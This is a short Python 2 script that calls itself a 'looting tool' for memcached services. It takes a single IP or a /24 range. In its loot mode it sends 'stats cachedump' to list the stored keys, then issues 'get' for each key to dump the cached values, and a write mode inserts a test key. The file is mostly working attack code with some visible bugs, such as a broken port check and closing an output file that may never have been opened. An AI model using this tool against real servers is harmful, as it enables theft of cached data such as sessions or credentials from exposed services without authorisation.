import argparse
import os, sys
import socket
from IPy import IP

'''
# Parse Command line args 
'''
mode_info = "info"
mode_loot = "loot"
mode_write = "write"
LOOTMODE = [mode_info, mode_loot, mode_write]

WRITE_CHECKER = ("VERYTEST","VERY_TEST_VALUE")

def cmd():
	parser = argparse.ArgumentParser(description='Simple looting tool for memcached services')	
	parser.add_argument('-t','--target', required=True, help='Specify target. It can be single host, or range of hosts, separated by hyphen. For now, only /24 net will scan n')
	parser.add_argument('-p','--port', default ="11211", help='Specify target port. By default 11211 is used\n')
	parser.add_argument('-m','--mode', default = mode_info, choices=LOOTMODE, help='Specify working mode. By default it tries to read all the possible data')
	parser.add_argument('-o','--output', help='File to write the output')

	args= parser.parse_args()
	mode = args.mode
	#Parse & Check target host
	target = args.target
	port = args.port
	try:
		int(port[1])
	except ValueError:
		print "[-]Incorrect port number: %s"%(port)
		sys.exit(-1)
	if not 0 <= int(port) <= 65535:
		print "[-]Incorrect port number: %s"%(port)
		sys.exit(-1)
	#Maybe to perform some additional checks here
	output = args.output

	# Create adequate check for IP addresses
	if 1 == 1:
		IP_oct = target.split('.')
		ipList = []
		#Splitting second octed. Mask /24
		mask_24 = IP_oct[3].split("-")
		if len(mask_24) == 1:
			ipList.append(target)
		else:	
			ranges_count = len(mask_24)/2
			#TODO: Add parsing of other masks /16 /8 /0 
			#TODO: Add parsing of hosts, separated by comma
			for i in xrange(int(mask_24[0]),int(mask_24[1])):
				ip = '.'.join((IP_oct[0],IP_oct[1],IP_oct[2],str(i)))
				try:
					IP(ip)
				except ValueError:
					print "[-]Incorrect ip address: %s"%(ip)
					sys.exit(-1)
				ipList.append(ip)
	print "[!] Will %s %s on port %s\n\n" % (mode, target, port)

	return (ipList,int(port),mode,output)


if __name__ == "__main__":
	ipList,port,mode,output = cmd()
	toFile = False
	if output != None:
		toFile = True
		try:
			f = open(output,'w+')
		except Exception:
			print "[-] Filename is not valid: %s" % (output)
			sys.exit(-1)
	if mode == mode_info:
		for ip in ipList:
			print "Getting info on MemCache from %s" % ip
			if toFile: f.write("\r\n%s\r\n\r\n" % ip)
			s = socket.socket()
			s.connect((ip,port))
			#First of all, we try to get all stored keys from memcached service
			#TODO: Make proper list of commands somewhere in global
			s.send("stats \r\n")
			resp = s.recv(4096)
			if toFile: 
				f.write("STATISTIC:\r\n")
				f.write("%s\r\n" % resp)
			#Second, we try to read value for each found key
			s.close()
			f.close()
	if mode == mode_loot:
		keys = []
		for ip in ipList:
			print "Looting MemCache from %s" % ip
			if toFile: f.write("\r\n%s\r\n\r\n" % ip)
			s = socket.socket()
			s.connect((ip,port))
			#First of all, we try to get all stored keys from memcached service
			s.send("stats cachedump 1 0\r\n")
			resp = ""
			resp = s.recv(1024)
			#Here we truncate the last two items because of END singnature
			for item in resp.split("\r\n")[:-2]:
				keys.append(item.split(" ")[1])
			print "[+]Found %d items: %s" % (len(keys), ', '.join((keys)))
			#Second, we try to read value for each found key
			for key in keys:
				mc_cmd = "get %s\r\n" % (key)
				s.send(mc_cmd)
				resp = s.recv(1024)
				print resp
				if toFile: f.write("%s\r\n" % resp)
			s.close()
			f.close()

	if mode == mode_write:
		for ip in ipList:
			s = socket.socket()
			s.connect((ip,port))
			s.send("add test 0 900000 2\r\n10\r\n")	
			print s.recv(1024)	
			print "[!?] Write actions to be write here"

